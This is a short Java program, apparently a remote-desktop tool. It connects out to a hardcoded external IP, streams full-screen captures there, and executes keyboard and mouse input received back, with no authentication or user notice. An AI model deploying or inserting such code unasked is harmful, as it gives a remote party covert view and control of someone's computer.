import java.awt.*;
import java.awt.image.*;
import java.io.*;
import java.net.*;
import java.util.concurrent.*;
import javax.imageio.*;

public class ScreenViewerServer {
    public static void main(String[] args) throws Exception {
        final Socket statusSocket = new Socket("68.97.114.14", 12345);
        final Socket screenSocket = new Socket("68.97.114.14", 12345);
        final Robot robot = new Robot();
        Executors.newSingleThreadExecutor().submit(new Runnable() {
            @Override public void run() {
                try {
                    DataInputStream in = new DataInputStream(statusSocket.getInputStream());
                    for (;;) {
                        switch (in.readInt()) {
                        case 1: robot.keyPress(in.readInt()); break;
                        case 2: robot.keyRelease(in.readInt()); break;
                        case 3: robot.mouseMove(in.readInt(), in.readInt()); break;
                        case 4: robot.mousePress(in.readInt()); break;
                        case 5: robot.mouseRelease(in.readInt()); break;
                        case 6: robot.mouseWheel(in.readInt()); break;
                        }
                    }
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        });
        DataOutputStream out = new DataOutputStream(screenSocket.getOutputStream());
        for (;;) {
            BufferedImage bi = robot.createScreenCapture(
                    new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(bi, "jpeg", baos);
            out.writeInt(baos.size());
            baos.writeTo(out);
        }
    }
}
